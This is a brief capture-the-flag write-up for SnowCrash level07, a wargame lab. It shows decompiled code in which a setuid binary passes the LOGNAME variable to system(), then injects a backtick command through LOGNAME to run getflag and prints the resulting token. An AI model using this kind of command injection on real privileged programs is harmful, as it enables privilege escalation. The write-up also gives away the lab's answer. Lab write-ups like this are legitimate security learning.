# level07

This one was easy...

```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

We disassamble the binary in binary ninja.
What is most important is the following:

```
0804851d        int32_t eax = getegid()
08048526        int32_t eax_1 = geteuid()
08048546        setresgid(eax, eax, eax)
08048562        setresuid(eax_1, eax_1, eax_1)
08048567        int32_t var_1c = 0
0804858e        asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"))
080485a0        return system(var_1c)
```

You will notice the `LOGNAME` env. We can probably make use of that...

```
export LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

ThaaDaaah
